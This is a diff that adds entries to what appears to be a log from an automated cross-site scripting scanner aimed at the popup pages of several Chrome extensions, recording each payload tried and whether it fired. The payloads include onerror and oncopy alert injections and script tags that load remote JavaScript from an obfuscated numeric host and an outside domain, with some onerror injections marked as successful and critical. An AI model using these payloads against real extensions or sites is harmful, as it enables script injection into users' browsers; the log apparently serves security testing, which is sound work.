@@ -13,3 +13,48 @@
 2023-06-12 22:31:23,860, 2023-06-12 22:31:23, Fail, Level <function info at 0x7f99f19485e0>, chrome-extension://loagcailiajflgahaaodjamccedceege/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
 2023-06-12 22:31:28,641, 2023-06-12 22:31:28, Fail, Level <function info at 0x7f99f19485e0>, chrome-extension://loagcailiajflgahaaodjamccedceege/popup.html, 'NIL', test123
 2023-06-12 22:34:50,354, 2023-06-12 22:34:50, Fail, Level <function info at 0x7f4f9c92c5e0>, chrome-extension://loagcailiajflgahaaodjamccedceege/popup.html, 'NIL', blaoejds222
+2023-06-15 11:00:50,897, 2023-06-15 11:00:50, Fail, Level <function info at 0x7f2515c245e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', blaoejds222
+2023-06-15 11:00:53,017, 2023-06-15 11:00:53, Fail, Level <function info at 0x7f2515c245e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 11:00:55,605, 2023-06-15 11:00:55, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 1, <img src=xss onerror=alert(1)>
+2023-06-15 11:01:01,227, 2023-06-15 11:01:01, Fail, Level <function info at 0x7f2515c245e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', test123
+2023-06-15 11:01:03,359, 2023-06-15 11:01:03, Fail, Level <function info at 0x7f2515c245e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-15 11:01:05,477, 2023-06-15 11:01:05, Fail, Level <function info at 0x7f2515c245e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-15 11:04:30,927, 2023-06-15 11:04:30, Fail, Level <function info at 0x7f1d7533c5e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', blaoejds222
+2023-06-15 11:04:33,044, 2023-06-15 11:04:33, Fail, Level <function info at 0x7f1d7533c5e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 11:04:37,089, 2023-06-15 11:04:37, Fail, Level <function info at 0x7f1d7533c5e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <img src=xss onerror=alert(1)>
+2023-06-15 11:04:39,204, 2023-06-15 11:04:39, Fail, Level <function info at 0x7f1d7533c5e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//brutelogic.com.br/1.js>
+2023-06-15 11:04:41,332, 2023-06-15 11:04:41, Fail, Level <function info at 0x7f1d7533c5e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
+2023-06-15 11:05:07,223, 2023-06-15 11:05:07, Fail, Level <function info at 0x7f24b8ad85e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', blaoejds222
+2023-06-15 11:05:09,344, 2023-06-15 11:05:09, Fail, Level <function info at 0x7f24b8ad85e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 11:05:21,382, 2023-06-15 11:05:21, Fail, Level <function info at 0x7fabd77185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', blaoejds222
+2023-06-15 11:05:23,500, 2023-06-15 11:05:23, Fail, Level <function info at 0x7fabd77185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 11:06:26,257, 2023-06-15 11:06:26, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 1, <img src=xss onerror=alert(1)>
+2023-06-15 11:06:26,859, 2023-06-15 11:06:26, Fail, Level <function info at 0x7fbfb699c5e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', test123
+2023-06-15 11:06:27,742, 2023-06-15 11:06:27, Fail, Level <function info at 0x7fbfb699c5e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', blaoejds222
+2023-06-15 11:06:28,394, 2023-06-15 11:06:28, Fail, Level <function info at 0x7fbfb699c5e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script src=//brutelogic.com.br/1.js>
+2023-06-15 11:06:28,990, 2023-06-15 11:06:28, Fail, Level <function info at 0x7fbfb699c5e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-15 11:06:29,892, 2023-06-15 11:06:29, Fail, Level <function info at 0x7fbfb699c5e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 11:06:30,533, 2023-06-15 11:06:30, Fail, Level <function info at 0x7fbfb699c5e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
+2023-06-15 11:06:31,125, 2023-06-15 11:06:31, Fail, Level <function info at 0x7fbfb699c5e0>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-15 11:07:04,002, 2023-06-15 11:07:03, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', test123
+2023-06-15 11:07:04,011, 2023-06-15 11:07:04, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <img src=xss onerror=alert(1)>
+2023-06-15 11:07:04,483, 2023-06-15 11:07:04, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', blaoejds222
+2023-06-15 11:07:06,175, 2023-06-15 11:07:06, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-15 11:07:06,184, 2023-06-15 11:07:06, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//brutelogic.com.br/1.js>
+2023-06-15 11:07:06,590, 2023-06-15 11:07:06, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 11:07:08,365, 2023-06-15 11:07:08, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-15 11:07:08,371, 2023-06-15 11:07:08, Fail, Level <function info at 0x7f9cc05185e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
+2023-06-15 11:09:30,178, 2023-06-15 11:09:30, Fail, Level <function info at 0x7ff38a7f05e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', test123
+2023-06-15 11:09:30,918, 2023-06-15 11:09:30, Fail, Level <function info at 0x7ff38a7f05e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', blaoejds222
+2023-06-15 11:09:41,427, 2023-06-15 11:09:41, Fail, Level <function info at 0x7f98144685e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', test123
+2023-06-15 11:09:42,119, 2023-06-15 11:09:42, Fail, Level <function info at 0x7f98144685e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', blaoejds222
+2023-06-15 11:09:42,119, 2023-06-15 11:09:42, Fail, Level <function info at 0x7f98144685e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <img src=xss onerror=alert(1)>
+2023-06-15 11:09:43,562, 2023-06-15 11:09:43, Fail, Level <function info at 0x7f98144685e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-15 11:09:54,977, 2023-06-15 11:09:54, Success, CRITICAL, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 1, <img src=xss onerror=alert(1)>
+2023-06-15 11:09:55,775, 2023-06-15 11:09:55, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', test123
+2023-06-15 11:09:56,465, 2023-06-15 11:09:56, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', blaoejds222
+2023-06-15 11:09:57,111, 2023-06-15 11:09:57, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//brutelogic.com.br/1.js>
+2023-06-15 11:09:57,896, 2023-06-15 11:09:57, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-15 11:09:58,588, 2023-06-15 11:09:58, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 11:09:59,225, 2023-06-15 11:09:59, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
+2023-06-15 11:10:00,016, 2023-06-15 11:10:00, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
